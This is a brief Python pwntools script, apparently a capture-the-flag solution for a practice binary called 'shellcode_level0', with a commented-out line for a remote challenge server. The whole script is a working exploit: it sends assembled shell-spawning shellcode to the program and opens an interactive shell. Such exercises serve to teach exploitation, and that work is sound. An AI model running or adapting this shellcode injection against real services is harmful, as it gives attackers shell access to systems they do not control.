from pwn import *
context(os='linux',arch='amd64',log_level='debug')

p = process('./shellcode_level0')
#p = remote('gz.imxbt.cn',20033)
elf = ELF('./shellcode_level0')

p.sendline(asm(shellcraft.sh()))

p.interactive()

